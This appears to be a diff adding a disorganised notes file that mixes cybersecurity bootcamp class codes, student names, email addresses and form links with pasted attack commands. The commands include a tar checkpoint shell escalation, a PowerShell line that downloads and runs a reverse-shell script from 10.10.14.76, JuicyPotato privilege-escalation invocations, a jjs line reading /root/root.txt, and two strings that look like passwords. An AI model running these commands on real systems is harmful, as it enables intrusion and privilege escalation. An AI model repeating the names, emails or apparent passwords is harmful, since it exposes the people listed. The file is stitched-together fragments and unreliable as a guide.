@@ -1,0 +1,122 @@
+  
+UPENN-VIRT-CYBER-11-2021-U-LOL-TTH   
+joseph jones  
+B2B-No 
+
+papeejones@gmail.com
+
+https://docs.google.com/forms/d/e/1FAIpQLSdb4ejjbqoqKO-Q4k7zeO_xwykwB0dxYLWYm1mX5Ik45MzEeg/viewform
+
+
+
+GWU-VIRT-CYBER-PT-01-2022-U-LOL-TTH
+Terrence Head
+B2B-No 
+
+t.head.1906@gmail.com
+
+
+Class Code:UNCC-VIRT-CYBER-09-2021-U-LOL-MW   
+Student Name:Elochukwu Ejefobiri 
+B2B-No 
+elochukwuejefobiri@gmail.com  
+
+https://docs.google.com/forms/d/e/1FAIpQLSdb4ejjbqoqKO-Q4k7zeO_xwykwB0dxYLWYm1mX5Ik45MzEeg/viewform
+
+
+https://docs.google.com/forms/d/e/1FAIpQLSc_q0CSp5Bpn7lfDAdoPCbBTW-OxWQVhC3gG5P9e6iE4FERjw/viewform
+
+
+
+
+
+sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+10:53
+Class Code:UCB-VIRT-CYBER-PT-08-2021-U-LOL-TTH
+
+
+
+powershell -c "iex(new-object net.webclient).downloadstring('http://10.10.14.76:8000/rev.ps1')"
+
+
+invoke-webrequest -uri http://10.10.14.76:8000/jp.exe -outfile jp.exe
+invoke-webrequest -uri http://10.10.14.76:8000/file.bat -outfile file.bat
+jp.exe -l 1337 -p \users\destitute\music\file.bat -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}               
+jp.exe -t * -p \users\destitute\music\file.bat -l 9001 -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
+                     
+{e60687f7-01a1-40aa-86ac-db1cbf673334}
+jp.exe -l 1337 -p file.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
+
+Class Code:ASU-VIRT-CYBER-PT-11-2021-U-LOL-TTH  
+Student Name:Kennedie Montoya
+B2B-No 
+kmontoya162@gmail.com
+
+
+https://docs.google.com/forms/d/e/1FAIpQLSdb4ejjbqoqKO-Q4k7zeO_xwykwB0dxYLWYm1mX5Ik45MzEeg/viewform
+
+
+https://docs.google.com/forms/d/e/1FAIpQLSc_q0CSp5Bpn7lfDAdoPCbBTW-OxWQVhC3gG5P9e6iE4FERjw/viewform
+
+
+
+
+UCLA-VIRT-CYBER-PT-10-2021-U-C-TTH    
+Ronald Marquez    
+B2B-No
+     
+ronald.marquez1@yahoo.com
+
+
+
+
+
+DU-VIRT-CYBER-PT-09-2021-U-LOL-MW
+Naomi Hill																		
+B2B-No
+
+
+naomithill2@gmail.com
+https://docs.google.com/forms/d/e/1FAIpQLSdb4ejjbqoqKO-Q4k7zeO_xwykwB0dxYLWYm1mX5Ik45MzEeg/viewform
+
+
+
+VU-VIRT-CYBER-PT-10-2021-U-LOL-MW
+Lea Snider
+B2B-No
+
+
+lea.snider50@gmail.com     
+https://docs.google.com/forms/d/e/1FAIpQLSdb4ejjbqoqKO-Q4k7zeO_xwykwB0dxYLWYm1mX5Ik45MzEeg/viewform
+
+
+https://docs.google.com/forms/d/e/1FAIpQLSc_q0CSp5Bpn7lfDAdoPCbBTW-OxWQVhC3gG5P9e6iE4FERjw/viewform
+
+
+h3mXK8RhU~f{]f5H                                                                                                                                                                                                                                                               
+t9KcS3>!0B#2
+
+echo 'var BufferedReader = Java.type("java.io.BufferedReader");
+var FileReader = Java.type("java.io.FileReader");
+var br = new BufferedReader(new FileReader("/root/root.txt"));
+while ((line = br.readLine()) != null) { print(line); }' | jjs
+
+
+
+
+
+WUSTL-VIRT-CYBER-PT-03-2022-U-LOL-TTH
+Steve Parker
+B2B-No
+
+
+WUSTL-VIRT-CYBER-PT-03-2022-U-LOL-TTH
+https://docs.google.com/forms/d/e/1FAIpQLSdb4ejjbqoqKO-Q4k7zeO_xwykwB0dxYLWYm1mX5Ik45MzEeg/viewform
+
+
+https://docs.google.com/forms/d/e/1FAIpQLSc_q0CSp5Bpn7lfDAdoPCbBTW-OxWQVhC3gG5P9e6iE4FERjw/viewform
+
+
+steve.parker105@yahoo.com
+
